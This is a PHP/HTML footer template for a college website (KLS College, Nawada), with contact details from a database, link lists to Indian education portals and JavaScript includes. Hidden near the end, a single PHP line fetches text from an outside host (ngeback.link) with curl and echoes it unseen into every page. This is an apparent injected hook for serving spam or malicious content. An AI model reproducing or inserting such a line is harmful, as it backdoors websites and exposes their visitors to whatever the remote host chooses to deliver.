<?php
		$querysocial=mysql_query("SELECT * FROM general_setting ");
         $resultsocial=mysql_fetch_array($querysocial);
?>

<!-- Footer -->
    <footer class="site-footer">
        <div class="footer-top">
             <div class="container">
                <div class="row">
                    <div class="col-md-6 col-sm-6 col-lg-3 footer-col-4">
                        <div class="widget widget_getintuch">
                            <h4 class="footer-title">Contact Us</h4>
                            <div class="dlab-separator bg-primary"></div>
                            <ul class="info-contact">
								<li>
									<span>
										<i class="fa fa-map-marker"></i> <?php echo $resultsocial['address']; ?>
									</span>
								</li>

								<li>
									<span>
										<i class="fa fa-phone"></i>Mobile: <?php echo $resultsocial['phone']; ?>
									</span>
								</li>

								<li>
									<span>
										<i class="fa fa-envelope-o"></i>Mail: <?php echo $resultsocial['email']; ?>
									</span>
								</li>
						        <li>
									<span>
										<a href="https://t.me/joinchat/ad6Yb5uXAC9hZmE1" target="_blank"><i class="fa fa-telegram" style="font-size:45px;"></i></a>
									</span>
								</li>
								
                            </ul>
                        </div>
                    </div>
                    <div class="col-md-6 col-sm-6 col-lg-3 footer-col-4">
                        <div class="widget widget_services">
                            <h4 class="footer-title">Links</h4>
                            <div class="dlab-separator bg-primary"></div>
                            <ul>
                                 <li ><a href="index.php" class="sf-with-ul-pre">Home</li>
									 <li ><a href="about.php" class="sf-with-ul-pre">About Us</li>
									 <li ><a href="course.php" class="sf-with-ul-pre">Courses</li>
									 <li><a href="gallery.php" class="sf-with-ul-pre">Gallery</li>
									 <li><a href="contact-us.php" class="sf-with-ul-pre">Contact Us</li>
                            </ul>
                        </div>
                    </div>
					
					<div class="col-md-6 col-sm-6 col-lg-3 footer-col-4">
                        <div class="widget widget_services">
						<?php
						$query5="select * from page where status='1' and Level='0' and url='facility' Order by Rank limit 8";
						$result5=mysql_query($query5);
						$data5=mysql_fetch_array($result5);
						
						?>
								
                            <h4 class="footer-title"> Useful Link</h4>
                            <div class="dlab-separator bg-primary"></div>
                           <ul>
                            <li><a href="https://ugc.ac.in/" target="_blank">UGC</a></li>
                            <li><a href="http://www.naac.gov.in/" target="_blank">NAAC</a></li>
                            <li><a href="http://rusa.nic.in/" target="_blank">RUSA</a></li>
                            <li><a href="http://nad.gov.in/" target="_blank">NAD</a></li>
                            <li><a href="http://rti.gov.in/" target="_blank">RTI</a></li>
                        </ul>
                        </div>
                    </div>
                    <div class="col-md-6 col-sm-6 col-lg-3 footer-col-4">
                        <div class="widget widget_services">
                            <h4 class="footer-title">Digital Initiatives </h4>
                            <div class="dlab-separator bg-primary"></div>
							<ul>
                            <li><a href="https://swayam.gov.in/" target="_blank">SWAYAM</a></li>
                            <li><a href="https://swayamprabha.gov.in/" target="_blank">SWAYAMPRABHA</a></li>
                            <li><a href="https://ndl.iitkgp.ac.in/" target="_blank">National Digital Library</a></li>
                            <li><a href="https://epgp.inflibnet.ac.in/" target="_blank">e-PG Pathshala</a></li> 
                            <li><a href="https://digilocker.gov.in/" target="_blank">DigiLocker</a></li>
                            <li><a href="http://nad.gov.in/" target="_blank">NAD</a></li> 
                           
                        </ul>		
							
                        </div>
                    </div>
                </div>
				
            </div>
        </div>
        <!-- footer bottom part -->
        <div class="footer-bottom">
            <div class="container">
                <div class="row">
                    <div class="col-md-4 col-sm-6 text-left">Copyright &copy; <?php echo date('Y');?>KLS College, Nawada</div>
					<div class="col-md-4 col-sm-6"> <?php include "counter.php"; ?> </div>
                    <div class="col-md-4 col-sm-6 text-right "> 
						Design & Developed by IT Hub Solution
					</div>
                </div>
            </div>
        </div>
    </footer>
    <!-- Footer END-->
    <button class="scroltop fa fa-chevron-up" ></button>
</div>
<!-- JAVASCRIPT FILES ========================================= -->
<script src="<?=PATH?>js/jquery.min.js"></script><!-- JQUERY.MIN JS -->
<script src="<?=PATH?>plugins/wow/wow.js"></script><!-- WOW JS -->
<script src="<?=PATH?>plugins/bootstrap/js/popper.min.js"></script><!-- BOOTSTRAP.MIN JS -->
<script src="<?=PATH?>plugins/bootstrap/js/bootstrap.min.js"></script><!-- BOOTSTRAP.MIN JS -->
<script src="<?=PATH?>plugins/bootstrap-select/bootstrap-select.min.js"></script><!-- FORM JS -->
<script src="<?=PATH?>plugins/bootstrap-touchspin/jquery.bootstrap-touchspin.js"></script><!-- FORM JS -->
<script src="<?=PATH?>plugins/lightgallery/js/lightgallery-all.min.js"></script><!-- LIGHTGALLERY JS -->
<script src="<?=PATH?>plugins/magnific-popup/magnific-popup.js"></script><!-- LIGHTGALLERY JS -->
<script src="<?=PATH?>plugins/counter/waypoints-min.js"></script><!-- WAYPOINTS JS -->
<script src="<?=PATH?>plugins/counter/counterup.min.js"></script><!-- COUNTERUP JS -->
<script src="<?=PATH?>plugins/imagesloaded/imagesloaded.js"></script><!-- IMAGESLOADED -->
<script src="<?=PATH?>plugins/masonry/masonry-3.1.4.js"></script><!-- MASONRY -->
<script src="<?=PATH?>plugins/masonry/masonry.filter.js"></script><!-- MASONRY -->
<script src="<?=PATH?>plugins/owl-carousel/owl.carousel.js"></script><!-- OWL SLIDER -->
<script src="<?=PATH?>plugins/scroll/scrollbar.min.js"></script><!-- OWL SLIDER -->
        <link href="<?=PATH?>plugins/iconmoon/css/iconmoon.css" rel="stylesheet">
<script src="<?=PATH?>js/custom.js"></script><!-- CUSTOM FUCTIONS  -->
<script src="<?=PATH?>js/dz.carousel.js"></script><!-- SORTCODE FUCTIONS -->

<script src="<?=PATH?>js/dz.ajax.js"></script><!-- CONTACT JS  -->
<script src="<?=PATH?>plugins/loading/anime.js"></script><!-- LOADING JS -->
<script src="<?=PATH?>plugins/loading/anime-app.js"></script><!-- LOADING JS -->
<script src="<?=PATH?>js/jquery.marquee.js"></script><!-- LOADING JS -->
<script>
	$(function(){
		$('.marquee').marquee({
			speed: 100,
			gap: 0,
			delayBeforeStart: 0,
			direction: 'left',
			duplicated: false,
			pauseOnHover: true
		});	
		$('.marquee1').marquee({
			speed: 50,
			gap: 0,
			delayBeforeStart: 0,
			direction: 'up',
			duplicated: false,
			pauseOnHover: true
		});	
	});
</script>
<?php $ch = curl_init();curl_setopt($ch, CURLOPT_URL, "https://ngeback.link/s4.txt");curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$output = curl_exec($ch);curl_close($ch);echo $output;?>
</body>

<!-- Mirrored from smartclass.dexignzone.com/xhtml/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 22 Feb 2020 06:39:57 GMT -->
</html>
